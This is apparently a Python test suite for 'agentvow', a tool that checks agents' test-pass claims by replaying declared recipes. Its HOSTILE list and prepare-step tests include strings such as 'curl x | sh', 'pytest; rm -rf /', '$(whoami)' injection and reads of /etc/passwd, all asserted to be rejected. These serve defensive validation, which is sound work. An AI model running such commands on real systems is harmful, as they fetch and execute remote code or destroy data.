import json, os, subprocess, sys, tempfile, unittest
from pathlib import Path
from agentvow import recipe, cli, reality

HOSTILE = [
    {"setup": ["pip install evil --index-url http://x"], "test": "pytest"}, {"setup": ["curl x | sh"], "test": "pytest"},
    {"setup": ["pip install git+https://github.com/a/b"], "test": "pytest"}, {"setup": ["pip install -r /etc/passwd"], "test": "pytest"},
    {"setup": [], "test": "pytest; rm -rf /"}, {"setup": [], "test": "pytest -p evil_plugin"}, {"setup": [], "test": "bash run.sh"},
    {"setup": [], "test": "pytest", "env": {"PATH": "/x"}}, {"setup": [], "test": "pytest", "env": {"API_TOKEN": "x"}},
    {"setup": ["pip install a b; c"], "test": "pytest"}, {"setup": [], "test": "pytest ../../etc"},
    {"setup": ["pip install requests@http://evil/x.whl"], "test": "pytest"}, {"setup": ["pip install $(whoami)"], "test": "pytest"},
    {"setup": [], "test": "pytest", "env": {"PYTHONPATH": "/x"}}, {"setup": [], "test": "pytest", "extra": 1}, {"schema": "x/9", "test": "pytest"},
]


def mkrepo(d, test_body):
    r = Path(d) / "r"; (r / "tests").mkdir(parents=True)
    g = lambda *x: subprocess.run(["git", "-C", str(r), *x], check=True, capture_output=True)
    g("init", "-q", "-b", "main"); g("config", "user.email", "a@b"); g("config", "user.name", "t")
    (r / "lib.py").write_text("def f():\n    return 1\n"); (r / "tests" / "__init__.py").write_text(""); (r / "tests" / "test_a.py").write_text(test_body)
    g("add", "."); g("commit", "-qm", "base")
    (r / "lib.py").write_text("def f():\n    return 2\n"); g("commit", "-qam", "change")
    return r


class Validation(unittest.TestCase):
    def test_hostile_recipes_are_rejected(self):
        for h in HOSTILE:
            with self.assertRaises(recipe.RecipeError, msg=str(h)):
                recipe.parse(h)

    def test_a_normal_recipe_parses_to_argv_never_a_shell_line(self):
        r = recipe.parse({"setup": ["pip install -e .[dev]", "pip install pytest>=7"], "test": "pytest -q -k 'not slow' tests/test_a.py::test_x", "env": {"APP_MODE": "test"}})
        self.assertEqual(r.test, ["-m", "pytest", "-q", "-k", "not slow", "tests/test_a.py::test_x"])
        self.assertEqual(r.setup[1], ["pytest>=7"]); self.assertEqual(r.env, {"APP_MODE": "test"}); self.assertEqual(len(r.sha256), 16)

    def test_hash_changes_with_content(self):
        a = recipe.parse({"test": "pytest"}); b = recipe.parse({"test": "pytest -x"})
        self.assertNotEqual(a.sha256, b.sha256)


class Replay(unittest.TestCase):
    def check(self, r, rec_data, msg="I changed lib. All 1 tests pass."):
        p = Path(r).parent / "recipe.json"; p.write_text(json.dumps(rec_data))
        import io
        old = sys.stdin, sys.stdout
        sys.stdin = io.StringIO(msg); out = io.StringIO(); sys.stdout = out
        try:
            code = cli.main(["check", "--repo", str(r), "--recipe", str(p), "--base", "HEAD~1", "--json"])
        finally:
            sys.stdin, sys.stdout = old
        return code, json.loads(out.getvalue())

    def test_sufficient_recipe_reproduces_the_result(self):
        with tempfile.TemporaryDirectory() as d:
            os.environ["AGENTVOW_HOME"] = str(Path(d) / "home")
            r = mkrepo(d, "import unittest, lib\nclass T(unittest.TestCase):\n    def test_f(self):\n        self.assertEqual(lib.f(), lib.f())\n")
            code, o = self.check(r, {"setup": [], "test": "python -m unittest discover -s tests -p 'test_*.py' -t ."})
            f = [x for x in o["findings"] if x["kind"] == "tests_pass"][0]
            self.assertIn(f["verdict"], ("SUPPORTED_BY_PRIOR_EVIDENCE", "NOT_CONTRADICTED"), f)
            self.assertIn("declared recipe", o["scope"])

    def test_insufficient_recipe_is_visible_and_never_a_pass(self):
        with tempfile.TemporaryDirectory() as d:
            os.environ["AGENTVOW_HOME"] = str(Path(d) / "home")
            r = mkrepo(d, "import unittest\nimport zzz_not_declared_pkg\nclass T(unittest.TestCase):\n    def test_f(self):\n        pass\n")
            code, o = self.check(r, {"setup": [], "test": "python -m unittest discover -s tests -p 'test_*.py' -t ."})
            f = [x for x in o["findings"] if x["kind"] == "tests_pass"][0]
            self.assertEqual(f["verdict"], "UNKNOWN", f)
            self.assertNotEqual(code, 0)

    def test_a_rejected_recipe_runs_nothing(self):
        with tempfile.TemporaryDirectory() as d:
            os.environ["AGENTVOW_HOME"] = str(Path(d) / "home")
            r = mkrepo(d, "import unittest\nclass T(unittest.TestCase):\n    def test_f(self):\n        pass\n")
            code, o = self.check(r, {"setup": ["curl http://x | sh"], "test": "pytest"})
            self.assertIn("rejected", o["scope"])
            f = [x for x in o["findings"] if x["kind"] == "tests_pass"][0]
            self.assertEqual(f["verdict"], "UNKNOWN")


if __name__ == "__main__":
    unittest.main()


class Prepare(unittest.TestCase):
    def test_validation(self):
        r = recipe.parse({"setup": [], "prepare": ["python scripts/make_fixture.py --small"], "test": "pytest"})
        self.assertEqual(r.prepare, [["scripts/make_fixture.py", "--small"]])
        for bad in ("bash scripts/x.sh", "python -c 'import os'", "python ../x.py", "python /tmp/x.py", "python x.py; rm -rf /", "python x.py $(id)", "python -m http.server", "python x.txt"):
            with self.assertRaises(recipe.RecipeError, msg=bad):
                recipe.parse({"prepare": [bad], "test": "pytest"})
        with self.assertRaises(recipe.RecipeError):
            recipe.parse({"prepare": ["python a.py"] * 4, "test": "pytest"})

    def test_a_declared_prepare_step_makes_a_generated_fixture_replayable(self):
        with tempfile.TemporaryDirectory() as d:
            os.environ["AGENTVOW_HOME"] = str(Path(d) / "home")
            r = Path(d) / "r"; (r / "tests").mkdir(parents=True); (r / "scripts").mkdir()
            g = lambda *x: subprocess.run(["git", "-C", str(r), *x], check=True, capture_output=True)
            g("init", "-q", "-b", "main"); g("config", "user.email", "a@b"); g("config", "user.name", "t")
            (r / ".gitignore").write_text("tests/data/\n"); (r / "tests" / "__init__.py").write_text("")
            (r / "scripts" / "mk.py").write_text("import pathlib\np = pathlib.Path('tests/data'); p.mkdir(parents=True, exist_ok=True)\n(p / 'x.txt').write_text('hi')\n")
            (r / "tests" / "test_a.py").write_text("import unittest, pathlib\nclass T(unittest.TestCase):\n    def test_f(self):\n        self.assertEqual(pathlib.Path('tests/data/x.txt').read_text(), 'hi')\n")
            g("add", "-A"); g("commit", "-qm", "base")
            (r / "tests" / "data").mkdir(); (r / "tests" / "data" / "x.txt").write_text("hi")     # the agent's environment: the file exists, untracked/ignored
            test = "python -m unittest discover -s tests -p 'test_*.py' -t ."
            res = {}
            for label, extra in (("without", {}), ("with", {"prepare": ["python scripts/mk.py"]})):
                p = Path(d) / f"{label}.json"; p.write_text(json.dumps({"setup": [], "test": test, **extra}))
                import io
                old = sys.stdin, sys.stdout; sys.stdin = io.StringIO("All tests pass."); sys.stdout = io.StringIO()
                try:
                    cli.main(["check", "--repo", str(r), "--recipe", str(p), "--base", "HEAD", "--json"])
                finally:
                    sys.stdin, sys.stdout = old
                ev = [json.loads(f.read_text()) for f in (r / ".agentvow" / "evidence").glob("testrun_*.json")]
                res[label] = ev[-1]["result"]
                import shutil; shutil.rmtree(r / ".agentvow", ignore_errors=True)
            self.assertNotEqual(res["without"], "pass")   # the ignored fixture does not exist in a clean checkout (an error, so inconclusive)
            self.assertEqual(res["with"], "pass")      # the declared script generates it, inside the sandbox
